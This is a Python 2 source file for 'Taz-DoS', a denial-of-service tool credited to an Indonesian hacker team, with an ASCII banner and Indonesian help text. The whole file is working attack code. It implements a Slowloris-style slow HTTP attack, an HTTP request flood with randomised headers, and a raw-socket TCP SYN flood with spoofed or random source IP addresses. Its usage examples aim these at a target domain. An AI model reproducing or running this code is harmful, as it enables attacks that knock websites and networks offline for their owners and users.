version="1.0"
class color:
    HEADER = '\033[0m'

title = color.HEADER + '''

_____________________   ______         ________________                    _ _           _ _ _      ________________
|                    | /      \        |              /                   |   |        /       \    |               |
|_______      _______|/        \       |_______      /                    |     |         _ _       |     __________|
        |     |      /    __    \             /     /     ______________  |       |_ /   /   \   \  |     |_________
        |     |     /    /  \    \           /     /     |______________| |         |   |     |   | |               |
        |     |    /    /____\    \         /     /                       |        _|   |     |   | |_________      |
        |     |   /     ______     \       /     /______                  |      _|  \   \_ _/   /   _________|     |
        |     |  /      |    |      \     /            |                  |    _|                   |               |
        |_____| /_______|    |_______\   /_____________|                  |_ _|        \ _ _ _ /    |_______________|



                                                 Tipe Tools: DDoS Attack
                                             Team: TazManianDevil Cyber Team
                                                   Post Date: 7/02/2020
                                                      Code By: DemonX
                                     Github: https://github.com/tazmaniandevilcyberteam
                             Pesan: Orang yang hanya bisa merusak sistem dia adalah seorang lammer
                         tapi orang yang bisa membuat program komputer, dia pantas disebut Elite Cyber!

===================================================================================================================
#                                     Sebelum Melakukan penyerangan, mari kita berdoa                             #
#  Allahumma bihaqqil faatihah wasirril faatihah ya faarijal hammi wa yaa kaasyifal ghammi ya man lli ibaadihii   # 
# yaghfiru wayarham Yaa daafi al bala i yaa Allah wa yaa daafi al bala i yaa rahmaan wa yaa daafi al balaa i yaa  #
#  rahiim Idfa annal gholaa a wal balaa a wal wabaa a wal fahsyaa a wal munkarra was suyuufal mukhtalifata wasy   # 
#       syada ida wal mihana maa dhahara minhaa wamaa bathana min baladinaa hadzaa khash shataw wamibbul daanil   #
#                                  muslimiina aammatan innaka alaama tasyaa u qadiir                              #
#                                                                                                                 #
#  source: https://correcto.id/beranda/read/25242/doa-tolak-bala-memohon-untuk-dijauhkan-dari-segala-marabahaya   #
#=================================================================================================================#

'''			
import os, sys, signal, httplib, urlparse, json, time, string, requests, colorama
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser,RawTextHelpFormatter
from termcolor import colored, cprint

signal.signal(signal.SIGPIPE,signal.SIG_DFL)

def fake_ip():
	skip = '127'
	rand = range(4)
	for x in range(4):
		rand[x] = randrange(0,256)
	if rand[0] == skip:
		fake_ip()
	fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
	return fkip

def check_tgt(args):
	tgt = args.target
	try:
		ip = gethostbyname(tgt)
	except:
		sys.exit(cprint('[-]Host tidak ditemukan','red'))
	return ip


def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents

def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots

class slow:
	def __init__(self,
		        tgt,
		        port,
		        to,
		        threads,
		        sleep):
		self.tgt = tgt
		self.port = port
		self.to = to
		self.threads = threads
		self.sleep = sleep
		self.method = ['GET','POST']
		self.pkt_count = 0
	def mypkt(self):
		text = choice(self.method) + ' /' + str(randint(1,999999999)) + ' HTTP/1.1\r\n'+\
		      'Host:'+self.tgt+'\r\n'+\
		      'User-Agent:'+choice(add_useragent())+'\r\n'+\
		      'Content-Length: 42\r\n'
		pkt = buffer(text)
		return pkt
	def building_socket(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count += 3
			if sock:
				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
				self.pkt_count += 1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			self.pkt_count+=3
			if sock:
				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Penyerangan dibatalkan','red'))
		return sock
	def sending_packets(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count+=3
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt+=1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Penyerangan dibatalkan','red'))
		return sock
	def doconnection(self):
		socks = 0
		fail=0
		lsocks=[]
		lhandlers=[]
		cprint('\t\tMembuat, dan menutupi sockets','red')
		while socks < (int(self.threads)):
			try:
				sock = self.building_socket()
				if sock:
					lsocks.append(sock)
					socks+=1
					if socks > int(self.threads):
						break
			except Exception:
				fail+=1
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Penyerangan dibatalkan','red'))
		cprint('\t\tMengirim paket ...','blue')
		while socks < int(self.threads):
			try:
				handler = self.sending_packets()
				if handler:
					lhandlers.append(handler)
					socks+=1
					if socks > int(self.threads):
						break
				else:
					pass
			except Exception:
				fail+=1
			except KeyboardInterrupt:
				break
				sys.exit(cprint('[-] Penyerangan dibatalkan .....','red'))
		print colored('We\'ve sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' paket berhasil terkirim. Kita\'re jeda selama ','green') + colored(self.sleep,'red') + colored(' seconds','green')
		time.sleep(self.sleep)

class Requester(Thread):
	def __init__(self,tgt):
		Thread.__init__(self)
		self.tgt = tgt
		self.port = None
		self.ssl = False
		self.req = []
		self.lock=Lock()
		url_type = urlparse.urlparse(self.tgt)
		if url_type.scheme == 'https':
			self.ssl = True
			if self.ssl == True:
				self.port = 443
		else:
			self.port = 80
	def header(self):
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
		bot = add_bots()
		c=choice(cachetype)
		a=choice(acceptEc)
		http_header = {
		    'User-Agent' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Accept-Encoding' : a,
		    'Keep-Alive' : '42',
		    'Host' : self.tgt,
		    'Referer' : choice(bot)
		}
		return http_header
	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters+string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)
	def create_url(self):
		return self.tgt + '?' + self.rand_str()
	def data(self):
		url = self.create_url()
		http_header = self.header()
		return (url,http_header)

	def run(self):
		try:
			if self.ssl:
				conn = httplib.HTTPSConnection(self.tgt,self.port)
			else:
				conn = httplib.HTTPConnection(self.tgt,self.port)
				self.req.append(conn)
			for reqter in self.req:
				(url,http_header) = self.data()
				method = choice(['get','post'])
				reqter.request(method.upper(),url,None,http_header)
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Penyerangan dibatalkan','red'))
		except Exception,e:
			print e
		finally:
			self.closeConnections()
	def closeConnections(self):
		for conn in self.req:
			try:
				conn.close()
			except:
				pass

class syn(Thread):
	def __init__(self,tgt,ip,sock=None):
		Thread.__init__(self)
		self.tgt = tgt
		self.ip = ip
		self.psh = ''
		if sock is None:
			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
			self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		else:
			self.sock=sock
		self.lock=Lock()
	def checksum(self):
		s = 0 
		for i in range(0,len(self.psh),2):
			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i+1]))
			s = s+w

		s = (s>>16) + (s & 0xffff)
		s = ~s & 0xffff

		return s
	def Building_packet(self):
		ihl=5
		version=4
		tos=0
		tot=40
		id=54321
		frag_off=0
		ttl=64
		protocol=IPPROTO_TCP
		check=10
		s_addr=inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = 54321
		dest = 80
		seq = 0
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		return packet

	def run(self):
		packet=self.Building_packet()
		try:
			self.lock.acquire()
			self.sock.sendto(packet,(self.tgt,0))
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Penyerangan dibatalkan .....','red'))
		except Exception,e:
			cprint(e,'red')
		finally:
			self.lock.release()

def main():
	parser = ArgumentParser(
        usage='./%(prog)s -t [target] -p [port] -t [number threads]',
        formatter_class=RawTextHelpFormatter,
        prog='Taz-DoS.py',
        description=cprint(title,'white',attrs=['bold']),
        epilog='''
Example:
    ./%(prog)s -target www.targetlu.com -port 80 -T 2000 -slow
    ./%(prog)s -target www.targetlu.com -sleep 100 -request
    ./%(prog)s -target www.targetlu.com -syn -T 5000 -t 10.0
'''
)
	options = parser.add_argument_group('options','')
	options.add_argument('-target',metavar='<ip/domain>',default=False,help='Target yang mau diserang')
	options.add_argument('-timeout',metavar='<timeout>',default=5.0,help='Timeout socketnya')
	options.add_argument('-threads',metavar='<threads>',default=1000,help='Threads Numbernya om (default = 800)')
	options.add_argument('-port',metavar='<port>',default=80,help='Port number, usahakan yang open port (default = 80)')
	options.add_argument('-sleep',metavar='<sleep time>',default=2,help='Sleep time nya berapa')
	options.add_argument('-spoof',metavar='<spoofed ip>',default=False,help='Spesifik spoof dari IP Address')
	options.add_argument('-request',action='store_true',help='Menyesuaikan request target')
	options.add_argument('-syn',action='store_true',help='Membolehkan SYN attack')
	options.add_argument('-slow',action='store_true',help='Membuka penyerangan secara perlahan')
	options.add_argument('-fakeip',action='store_true',default=False,help='Untuk membuat fake IP jika tidak memungkinkan penggunaan spoof')
	args = parser.parse_args()
	if args.target == False:
		parser.print_help()
		sys.exit()
	add_bots();add_useragent()
	if args.target:
		check_tgt(args)
	if args.syn:
		uid = os.getuid()
		if uid == 0:
			cprint('[*] Kamu memiliki izin untuk menjalankan Taz-DoS','green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('[*] Kamu tidak memiliki izin\'untuk menjalankannya','red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print colored('[*] SYN dikirimkan: ','blue')+colored(tgt,'red')
		while 1:
			if args.spoof == False:
				args.fakeip = True
				if args.fakeip == True:
					ip = fake_ip()
			else:
				ip = args.spoof
			try:
					thread=syn(tgt,ip,sock=synsock)
					thread.setDaemon(True)
					thread.start()
					thread.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Penyerangan dibatalkan .....','red'))
	elif args.request:
		tgt = args.target
		threads = []
		print colored('[*] Sedang mengirim paket ke: ','blue')+colored(tgt,'red')
		while 1:
			try:
				for x in xrange(int(args.threads)):
					t=Requester(tgt)
					t.setDaemon(True)
					t.start()
					t.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Penyerangan dibatalkan ....','red'))
	elif args.slow:
		try:
			tgt = args.target
			port = args.port
			to = float(args.timeout)
			st = int(args.spoof)
			threads = int(args.threads)
		except Exception,e:
			print '[+]',e
		while 1:
			try:
				worker=slow(tgt,port,to,threads,st)
				worker.doconnection()
			except KeyboardInterrupt:
				sys.exit(cprint('[+] Attack canceled by user','red'))
	if not (args.syn) and not (args.request) and not (args.slow):
		parser.print_help()
		print
		cprint('[*] Argument harus spesifik.','red')
		sys.exit(cprint('[*] -syn | -request | -slow [+]','red'))

if __name__ == '__main__':
	main()